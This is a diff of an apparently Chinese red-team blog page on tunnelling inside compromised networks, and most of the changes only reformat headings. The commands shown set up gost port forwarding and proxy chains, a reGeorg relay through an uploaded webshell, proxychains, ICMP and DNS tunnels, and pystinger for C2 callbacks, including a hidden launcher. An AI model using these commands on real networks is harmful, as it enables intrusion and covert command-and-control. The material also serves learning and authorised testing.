 <pre tabindex="0"><code>gost -L udp://:10053/192.168.1.1:53</code></pre><p>将本地的UDP端口10053映射到192.168.1.1的53端口，所有到本地10053端口的数据会被转发到192.168.1.1:53。</p>
-<p>######## TCP本地端口转发(转发链)</p>
-<p>命令行配置文件</p>
+<h4 id="tcp本地端口转发转发链" class="heading-element"><span>TCP本地端口转发(转发链)</span>
+  <a href="#tcp%e6%9c%ac%e5%9c%b0%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91%e8%bd%ac%e5%8f%91%e9%93%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>命令行配置文件</p>
 <pre tabindex="0"><code>gost -L=tcp://:8080/192.168.1.1:80 -F socks5://192.168.1.2:1080</code></pre><p>将本地的TCP端口8080通过转发链映射到192.168.1.1的80端口。</p>
-<p>######## TCP远程端口转发</p>
-<p>命令行配置文件</p>
+<h4 id="tcp远程端口转发" class="heading-element"><span>TCP远程端口转发</span>
+  <a href="#tcp%e8%bf%9c%e7%a8%8b%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>命令行配置文件</p>
 <pre tabindex="0"><code>gost -L=rtcp://:2222/:22 -F socks5://192.168.1.2:1080</code></pre><p>在192.168.1.2上开启并监听TCP端口2222，并将192.168.1.2上的2222端口映射到本地TCP端口22，所有到192.168.1.2:2222的数据会被转发到本地端口22。</p>
-<p>######## UDP远程端口转发</p>
-<p>命令行配置文件</p>
+<h4 id="udp远程端口转发" class="heading-element"><span>UDP远程端口转发</span>
+  <a href="#udp%e8%bf%9c%e7%a8%8b%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>命令行配置文件</p>
 <pre tabindex="0"><code>gost -L=rudp://:10053/:53 -F socks5://192.168.1.2:1080</code></pre><p>在192.168.1.2上开启并监听UDP端口10053，并将192.168.1.2上的10053端口映射到本地UDP端口53，所有到192.168.1.2:10053的数据会被转发到本地端口53。</p>
-<p>####### 多层代理</p>
-<pre tabindex="0"><code>#####代理跳板
-#####第三层跳板，设置代理
+<h3 id="多层代理" class="heading-element"><span>多层代理</span>
+  <a href="#%e5%a4%9a%e5%b1%82%e4%bb%a3%e7%90%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><pre tabindex="0"><code>#代理跳板
+#第三层跳板，设置代理
 ./gost -L mtls+kcp://admin:123456@0.0.0.0:22222
 
-#####第二层跳板，设置代理，且指定后续跳转到第三层跳板
+#第二层跳板，设置代理，且指定后续跳转到第三层跳板
 ./gost -L=socks5://admin:123456@:22222 -F=mtls+kcp://admin:123456@第三层跳板的IP:22222
 
-#####第一层跳板，开启代理1080端口，且指定第二层和第三层跳板
-.\gost.exe -L socks5://:1080 -F=mtls+kcp://admin:123456@第二层跳板的IP:22222 -F=mtls+kcp://admin:123456@第三层跳板的IP:22222     #顺序不能乱、不能少</code></pre><h6 id="msf" class="heading-element"><span>0.0.0.3.4  MSF</span>
+#第一层跳板，开启代理1080端口，且指定第二层和第三层跳板
+.\gost.exe -L socks5://:1080 -F=mtls+kcp://admin:123456@第二层跳板的IP:22222 -F=mtls+kcp://admin:123456@第三层跳板的IP:22222     #顺序不能乱、不能少</code></pre><h2 id="msf" class="heading-element"><span>MSF</span>
   <a href="#msf" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310221106673.webp" alt="image-20231022110615567" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310221106673.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310221106673.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310221106673.webp?size=large 2x" data-title="image-20231022110615567" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h5 id="三隧道" class="heading-element"><span>0.0.0.4  三、隧道</span>
+</h2><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310221106673.webp" alt="image-20231022110615567" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310221106673.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310221106673.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310221106673.webp?size=large 2x" data-title="image-20231022110615567" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h1 id="三隧道" class="heading-element"><span>三、隧道</span>
   <a href="#%e4%b8%89%e9%9a%a7%e9%81%93" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p><a href="https://www.freebuf.com/articles/network/242015.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.freebuf.com/articles/network/242015.html</a></p>
+</h1><p><a href="https://www.freebuf.com/articles/network/242015.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.freebuf.com/articles/network/242015.html</a></p>
 <p>常用的隧道技术有以下三种：</p>
 <ul>
 <li>
@@ -702,11 +804,11 @@ Client side: gost -L=:8080 -F=socks5://vps:1080?notls=true</code></pre><p>正向
 <pre tabindex="0"><code> nslookup www.baidu.com vps-ip
  nslookup www.baidu.com     // 不指定服务器，则使用默认的DNS服务器</code></pre><p>dig是linux系统自带的DNS探测命令，执行：</p>
 <pre tabindex="0"><code> dig @vps-ip www.baidu.com
- dig www.baidu.com          // 不指定服务器，则使用默认的DNS服务器</code></pre><h6 id="http---regeorg" class="heading-element"><span>0.0.0.4.1  HTTP - reGeorg</span>
+ dig www.baidu.com          // 不指定服务器，则使用默认的DNS服务器</code></pre><h2 id="http---regeorg" class="heading-element"><span>HTTP - reGeorg</span>
   <a href="#http---regeorg" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>地址：https://github.com/sensepost/reGeorg</p>
+</h2><p>地址：https://github.com/sensepost/reGeorg</p>
 <blockquote>
 <p>例如有一台主机运行了web服务IP映射到公网任何人都可以任意访问，还有一台主机是内网中的主机外部访问不到。假设在公网的web主机已经上传了webshell，但无法反弹shell，无法直接将内网主机通过端口映射到外网主机。</p>
 <p>reGeorg这时就起作用了，通过上传reGeorg文件在web服务运行，使得攻击者发出的请求以及目标机器的响应经web服务的http转发，达到攻击者可以和内网主机进行通信的效果。</p>
@@ -731,11 +833,17 @@ Client side: gost -L=:8080 -F=socks5://vps:1080?notls=true</code></pre><p>正向
 </span></span><span style="display:flex;"><span>  -v , --verbose       Verbose output<span style="color:#ff636f">[</span>INFO|DEBUG<span style="color:#ff636f">]</span></span></span></code></pre></div><p>==运行python脚本前一定要给上传到跳板机的脚本文件加权限！==</p>
 <p>python2运行reGeorgSocksProxy.py脚本配置代理，当程序卡在“Georg says, &lsquo;All seems fine&rsquo;”表示正常运行</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python2 reGeorgSocksProxy.py -p <span style="color:#a6be9d">8080</span> -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp</span></span></code></pre></div><p>-p指定端口后用proxy工具连接到这个端口就好，windows用proxifier，linux用proxychains</p>
-<p>####### reGeorg+Proxifier</p>
-<p>这个软件值得说的只有代理规则的配置</p>
+<h3 id="regeorgproxifier" class="heading-element"><span>reGeorg+Proxifier</span>
+  <a href="#regeorgproxifier" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>这个软件值得说的只有代理规则的配置</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310190024328.webp" alt="image-20231019002447098" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310190024328.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310190024328.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310190024328.webp?size=large 2x" data-title="image-20231019002447098" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>####### reGeorg+proxychains</p>
-<p><a href="https://blog.lanweihong.com/posts/49517/"target="_blank" rel="external nofollow noopener noreferrer">https://blog.lanweihong.com/posts/49517/</a></p>
+<h3 id="regeorgproxychains" class="heading-element"><span>reGeorg+proxychains</span>
+  <a href="#regeorgproxychains" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><a href="https://blog.lanweihong.com/posts/49517/"target="_blank" rel="external nofollow noopener noreferrer">https://blog.lanweihong.com/posts/49517/</a></p>
 <p>ProxyChains 遵循GNU协议的一款适用于linux系统的网络代理设置工具。强制由任一程序发起的TCP连接请求必须通过诸如TOR 或 SOCKS4, SOCKS5 或HTTP(S) 代理。支持的认证方式包括：SOCKS4/5的用户/密码认证，HTTP的基本认证。允许TCP和DNS通过代理隧道，并且可配置多个代理。</p>
 <p>GitHub:</p>
 <ul>
@@ -769,16 +877,16 @@ cd .. &amp;&amp; rm -rf proxychains-ng</code></pre><p>安装后默认配置文�
 </ul>
 <p>我们只需要编辑proxychains的配置文件，将scosks代理的ip，端口，用户名，密码填进去即可</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>vi /etc/proxychains.conf <span style="color:#828b96;font-style:italic">#直接划到最后</span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####socks4 127.0.0.1 9050 #注释或者直接删掉默认的本地代理</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#socks4 127.0.0.1 9050 #注释或者直接删掉默认的本地代理</span>
 </span></span><span style="display:flex;"><span>socks5 104.168.13.4 <span style="color:#a6be9d">19059</span> <span style="color:#58a1dd">test</span> passwd <span style="color:#828b96;font-style:italic">#填入socks代理信息</span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####保存并退出</span></span></span></code></pre></div><p>使用：</p>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#保存并退出</span></span></span></code></pre></div><p>使用：</p>
 <p>只需要使用代理的命令前加上proxychains就可以了，比如<code>proxychains4 curl cip.cc</code>，我们可以看到IP已经变成socks代理的IP。</p>
 <p>当然，我们也可以直接输入<code>proxychains bash</code>，这样就能新建一个具有代理功能的新终端，不需要在每条命令前都加proxychains了。</p>
-<h6 id="icmp" class="heading-element"><span>0.0.0.4.2  ICMP</span>
+<h2 id="icmp" class="heading-element"><span>ICMP</span>
   <a href="#icmp" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>在 ICMP 通信协议中，==通信双方的两台设备不需要开放端口即可进行，而在一般的通信协议中，是必须要开放端口的==。</p>
+</h2><p>在 ICMP 通信协议中，==通信双方的两台设备不需要开放端口即可进行，而在一般的通信协议中，是必须要开放端口的==。</p>
 <p>icmp隧道主要因为大部分防火墙不会屏蔽 ping ，所以可以将流量封装在icmp进行传输，这种速度跟sockets相比太慢了，特殊情况才会使用。</p>
 <p>icmpsh的使用：</p>
 <p>imcpsh.exe参数：</p>
@@ -796,11 +904,11 @@ cd .. &amp;&amp; rm -rf proxychains-ng</code></pre><p>安装后默认配置文�
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310220149858.webp" alt="image-20231022014944745" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310220149858.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310220149858.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310220149858.webp?size=large 2x" data-title="image-20231022014944745" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310220202329.webp" alt="image-20231022020256220" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310220202329.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310220202329.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310220202329.webp?size=large 2x" data-title="image-20231022020256220" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310220157255.webp" alt="image-20231022015723088" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310220157255.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310220157255.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310220157255.webp?size=large 2x" data-title="image-20231022015723088" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h6 id="dns" class="heading-element"><span>0.0.0.4.3  DNS</span>
+<h2 id="dns" class="heading-element"><span>DNS</span>
   <a href="#dns" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>这个比较麻烦需要准备一个域名，和一台DNS服务器，在域名解析添加一条NS记录和一条A记录。举个例子，域名是<a href="https://link.zhihu.com/?target=http%3A//123.com"target="_blank" rel="external nofollow noopener noreferrer">http://123.com</a>，添加一个子域名<a href="https://link.zhihu.com/?target=http%3A//a.123.com"target="_blank" rel="external nofollow noopener noreferrer">http://a.123.com</a>，且类型为NS，并将NS记录指向<a href="https://link.zhihu.com/?target=http%3A//b.123.com"target="_blank" rel="external nofollow noopener noreferrer">http://b.123.com</a>，然后将<a href="https://link.zhihu.com/?target=http%3A//b.123.com"target="_blank" rel="external nofollow noopener noreferrer">http://b.123.com</a>建立A记录服务器IP即可，利用的工具也很多，本文简单介绍dns2tcp。</p>
+</h2><p>这个比较麻烦需要准备一个域名，和一台DNS服务器，在域名解析添加一条NS记录和一条A记录。举个例子，域名是<a href="https://link.zhihu.com/?target=http%3A//123.com"target="_blank" rel="external nofollow noopener noreferrer">http://123.com</a>，添加一个子域名<a href="https://link.zhihu.com/?target=http%3A//a.123.com"target="_blank" rel="external nofollow noopener noreferrer">http://a.123.com</a>，且类型为NS，并将NS记录指向<a href="https://link.zhihu.com/?target=http%3A//b.123.com"target="_blank" rel="external nofollow noopener noreferrer">http://b.123.com</a>，然后将<a href="https://link.zhihu.com/?target=http%3A//b.123.com"target="_blank" rel="external nofollow noopener noreferrer">http://b.123.com</a>建立A记录服务器IP即可，利用的工具也很多，本文简单介绍dns2tcp。</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>a.123.com NS b.123.com
 </span></span><span style="display:flex;"><span>b.123.com A 1.1.1.1</span></span></code></pre></div><p><a href="https://link.zhihu.com/?target=https%3A//github.com/HEYAHONG/dns2tcp"target="_blank" rel="external nofollow noopener noreferrer">https://link.zhihu.com/?target=https%3A//github.com/HEYAHONG/dns2tcp</a></p>
 <p><strong>客户端</strong></p>
@@ -818,11 +926,11 @@ cd .. &amp;&amp; rm -rf proxychains-ng</code></pre><p>安装后默认配置文�
 </span></span><span style="display:flex;"><span>resources = ssh:127.0.0.1:22,smtp:127.0.0.1:25,socks:127.0.0.1:1080,http:127.0.0.1:80,https:127.0.0.1:8080</span></span></code></pre></div><p>然后执行，dns隧道就搭建好了，利用nc进行传输文件即可。</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>dns2tcpd -F -d 3 -f /home/dns2tcpd.conf</span></span></code></pre></div><p>建立传输</p>
 <p>目标主机监听并接受文件即可。</p>
-<h6 id="毒刺-pystinger" class="heading-element"><span>0.0.0.4.4  毒刺-pystinger</span>
+<h2 id="毒刺-pystinger" class="heading-element"><span>毒刺-pystinger</span>
   <a href="#%e6%af%92%e5%88%ba-pystinger" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>pystinger 可通过 webshell 实现ss4代理、端口映射，并且可以利用pystinge实现CobaltStrike / Metasploit上线。由于稳定性、速度一般，不建议优先使用，在常规正向代理没法用、只能访问web服务的时候或者想在不出网的机器上C2，可以尝试。</p>
+</h2><p>pystinger 可通过 webshell 实现ss4代理、端口映射，并且可以利用pystinge实现CobaltStrike / Metasploit上线。由于稳定性、速度一般，不建议优先使用，在常规正向代理没法用、只能访问web服务的时候或者想在不出网的机器上C2，可以尝试。</p>
 <p>下载地址：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FFunnyWolf%2Fpystinger"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/FunnyWolf/pystinger</a></p>
 <p>通过webshell实现内网SOCK4代理，端口映射可以使目标不出网情况下在cs上线。</p>
 <ol>
@@ -870,15 +978,15 @@ ws.run &#34;cmd /c D:\XXXXX\stinger_server.exe 0.0.0.0&#34;,vbhide</code></pre><
 </ul>
